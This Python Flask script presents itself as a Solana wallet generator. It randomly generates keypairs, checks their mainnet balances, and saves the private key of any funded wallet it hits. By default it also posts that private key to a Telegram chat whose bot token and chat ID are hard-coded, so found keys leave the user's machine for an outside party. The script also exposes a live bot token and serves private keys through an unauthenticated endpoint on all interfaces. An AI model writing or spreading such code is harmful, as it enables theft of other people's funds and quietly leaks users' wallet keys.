import time
import requests
import base58
import nacl.signing
from colorama import Fore, Style, init
from flask import Flask, render_template_string, request, jsonify
import threading
import argparse
import webbrowser

# Initialize colorama for Windows support
init(autoreset=True)

app = Flask(__name__)

# Configuration
DEFAULT_PORT = 5000
DEFAULT_RPC_URL = "https://api.mainnet-beta.solana.com"
WALLET_FILE = "solana_wallets.txt"

# Telegram configuration
TELEGRAM_TOKEN = "8481417913:AAH65jDSXYt8Z9CKOJW2VwxVG-nuanTe-FE"
TELEGRAM_CHAT_ID = "7521446360"

# Global variables
console_output = []
running = False
generation_thread = None
rpc_url = DEFAULT_RPC_URL

def parse_arguments():
    parser = argparse.ArgumentParser(description='Solana Wallet Generator Web Interface')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT,
                       help=f'Port to run the server on (default: {DEFAULT_PORT})')
    parser.add_argument('--rpc', type=str, default=DEFAULT_RPC_URL,
                       help=f'Solana RPC endpoint (default: {DEFAULT_RPC_URL})')
    parser.add_argument('--no-browser', action='store_true',
                       help='Disable automatic browser opening')
    parser.add_argument('--no-telegram', action='store_true',
                       help='Disable Telegram notifications')
    return parser.parse_args()

def send_telegram_notification(message):
    """Send notification to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code != 200:
            add_to_console(Fore.RED + f"Telegram error: {response.text}")
    except Exception as e:
        add_to_console(Fore.RED + f"Telegram connection error: {str(e)}")

def generate_solana_address():
    """Generate a new Solana wallet address and private key"""
    signing_key = nacl.signing.SigningKey.generate()
    verify_key = signing_key.verify_key
    sol_address = base58.b58encode(verify_key.encode()).decode()
    solana_private_key = signing_key.encode() + verify_key.encode()
    private_key_base58 = base58.b58encode(solana_private_key).decode()
    return sol_address, private_key_base58

def get_solana_balance(address):
    """Check balance of a Solana address"""
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [address]
    }
    try:
        response = requests.post(rpc_url, json=payload, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get("result", {}).get("value", 0)
        add_to_console(Fore.RED + f"RPC Error: {response.text}")
    except Exception as e:
        add_to_console(Fore.RED + f"Connection error: {str(e)}")
    return None

def save_wallet(address, private_key, balance):
    """Save wallet details to file and send notifications"""
    # Save to file
    with open(WALLET_FILE, "a") as file:
        file.write(f"Address: {address}\nPrivate Key: {private_key}\nBalance: {balance} lamports\n{'-'*40}\n")
    
    # Prepare notification message
    sol_balance = balance / 1_000_000_000
    message = (
        f"💰 <b>SOLANA WALLET FOUND!</b> 💰\n\n"
        f"<b>Address:</b> <code>{address}</code>\n"
        f"<b>Balance:</b> {sol_balance:.9f} SOL\n\n"
        f"<b>Private Key:</b>\n<code>{private_key}</code>"
    )
    
    # Add to console
    add_to_console(Fore.MAGENTA + f"Wallet saved to {WALLET_FILE}")
    
    # Send Telegram notification if enabled
    if not args.no_telegram:
        send_telegram_notification(message)

def add_to_console(text):
    """Add message to console output with timestamp"""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    console_output.append(f"[{timestamp}] {text}")
    if len(console_output) > 100:
        console_output.pop(0)

def generation_loop():
    """Main generation loop running in background thread"""
    global running
    while running:
        try:
            sol_address, private_key = generate_solana_address()
            
            add_to_console(Fore.CYAN + f"Address: {sol_address}")
            add_to_console(Fore.YELLOW + f"Private Key: {private_key}")

            balance = get_solana_balance(sol_address)
            if balance is not None:
                sol_balance = balance / 1_000_000_000
                balance_msg = f"Balance: {balance:,} lamports ({sol_balance:.9f} SOL)"
                if balance > 0:
                    add_to_console(Fore.GREEN + balance_msg)
                    save_wallet(sol_address, private_key, balance)
                else:
                    add_to_console(Fore.RED + balance_msg)
        except Exception as e:
            add_to_console(Fore.RED + f"Generation error: {str(e)}")
        
        time.sleep(0.2)

@app.route('/')
def index():
    """Main page with web interface"""
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Solana Wallet Generator</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #1a1a1a;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        h1 {
            color: #0af;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .console {
            background-color: #000;
            border: 2px solid #333;
            border-radius: 5px;
            padding: 15px;
            height: 500px;
            overflow-y: auto;
            margin-bottom: 20px;
            white-space: pre-wrap;
            font-size: 14px;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        button {
            background-color: #333;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            min-width: 120px;
        }
        button:hover {
            background-color: #444;
        }
        button:disabled {
            background-color: #222;
            color: #666;
            cursor: not-allowed;
        }
        .status {
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
            font-weight: bold;
        }
        .running {
            background-color: #2d572c;
        }
        .stopped {
            background-color: #572c2c;
        }
        .timestamp {
            color: #666;
        }
        .address {
            color: #0af;
        }
        .private-key {
            color: #ff0;
            word-break: break-all;
        }
        .balance {
            color: #f55;
        }
        .error {
            color: #f55;
        }
        .success {
            color: #5f5;
        }
        .info {
            color: #0af;
        }
        .config {
            background-color: #222;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .config-item {
            margin-bottom: 8px;
        }
        .config-label {
            font-weight: bold;
            display: inline-block;
            width: 120px;
        }
        .telegram-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .telegram-on {
            background-color: #5f5;
        }
        .telegram-off {
            background-color: #f55;
        }
        @media (max-width: 600px) {
            .console {
                height: 300px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Solana Wallet Generator</h1>
        
        <div class="config">
            <div class="config-item"><span class="config-label">RPC URL:</span> {{ rpc_url }}</div>
            <div class="config-item"><span class="config-label">Port:</span> {{ port }}</div>
            <div class="config-item"><span class="config-label">Output File:</span> {{ wallet_file }}</div>
            <div class="config-item">
                <span class="config-label">Telegram:</span> 
                <span class="telegram-status {{ 'telegram-on' if not no_telegram else 'telegram-off' }}"></span>
                {{ 'Enabled' if not no_telegram else 'Disabled' }}
            </div>
        </div>
        
        <div class="controls">
            <button id="startBtn" onclick="startGeneration()">Start Generation</button>
            <button id="stopBtn" onclick="stopGeneration()" disabled>Stop Generation</button>
            <button onclick="clearConsole()">Clear Console</button>
        </div>
        
        <div id="status" class="status stopped">Status: Stopped</div>
        
        <div id="console" class="console"></div>
    </div>

    <script>
        function updateConsole() {
            fetch('/get_console')
                .then(response => response.json())
                .then(data => {
                    const consoleElement = document.getElementById('console');
                    let htmlContent = data.output.map(line => {
                        // Convert color codes to HTML spans
                        line = line.replace(/\x1b\[31m/g, '<span class="error">')
                                  .replace(/\x1b\[32m/g, '<span class="success">')
                                  .replace(/\x1b\[33m/g, '<span class="private-key">')
                                  .replace(/\x1b\[35m/g, '<span class="success">')
                                  .replace(/\x1b\[36m/g, '<span class="address">')
                                  .replace(/\x1b\[0m/g, '</span>');
                        
                        // Extract timestamp
                        const timestampEnd = line.indexOf(']');
                        const timestamp = line.substring(0, timestampEnd + 1);
                        const content = line.substring(timestampEnd + 2);
                        return `<span class="timestamp">${timestamp}</span> ${content}`;
                    }).join('\n');
                    consoleElement.innerHTML = htmlContent;
                    consoleElement.scrollTop = consoleElement.scrollHeight;
                });
        }

        function startGeneration() {
            fetch('/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('startBtn').disabled = true;
                        document.getElementById('stopBtn').disabled = false;
                        document.getElementById('status').className = 'status running';
                        document.getElementById('status').textContent = 'Status: Running';
                    }
                });
        }

        function stopGeneration() {
            fetch('/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('startBtn').disabled = false;
                        document.getElementById('stopBtn').disabled = true;
                        document.getElementById('status').className = 'status stopped';
                        document.getElementById('status').textContent = 'Status: Stopped';
                    }
                });
        }

        function clearConsole() {
            fetch('/clear', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('console').innerHTML = '';
                    }
                });
        }

        // Update console every second
        setInterval(updateConsole, 1000);
        // Initial update
        updateConsole();
    </script>
</body>
</html>
    ''', rpc_url=rpc_url, port=args.port, wallet_file=WALLET_FILE, no_telegram=args.no_telegram)

@app.route('/start', methods=['POST'])
def start_generation():
    global running, generation_thread
    if not running:
        running = True
        generation_thread = threading.Thread(target=generation_loop)
        generation_thread.daemon = True
        generation_thread.start()
        add_to_console(Fore.GREEN + "Generation started")
        if not args.no_telegram:
            send_telegram_notification("🔵 Solana Wallet Generator started running")
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_generation():
    global running
    if running:
        running = False
        if generation_thread:
            generation_thread.join(timeout=1)
        add_to_console(Fore.RED + "Generation stopped")
        if not args.no_telegram:
            send_telegram_notification("🔴 Solana Wallet Generator stopped")
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Not running"})

@app.route('/clear', methods=['POST'])
def clear_console():
    global console_output
    console_output = []
    add_to_console(Fore.GREEN + "Console cleared")
    return jsonify({"success": True})

@app.route('/get_console')
def get_console():
    return jsonify({"output": console_output})

if __name__ == '__main__':
    args = parse_arguments()
    rpc_url = args.rpc
    
    add_to_console(Fore.GREEN + "Solana Wallet Generator started")
    add_to_console(Fore.CYAN + f"Using RPC: {rpc_url}")
    if not args.no_telegram:
        add_to_console(Fore.MAGENTA + "Telegram notifications: ENABLED")
    else:
        add_to_console(Fore.YELLOW + "Telegram notifications: DISABLED")
    add_to_console(Fore.YELLOW + "Press 'Start Generation' to begin")
    
    if not args.no_browser:
        webbrowser.open_new_tab(f"http://localhost:{args.port}")
    
    app.run(host='0.0.0.0', port=args.port, threaded=True)
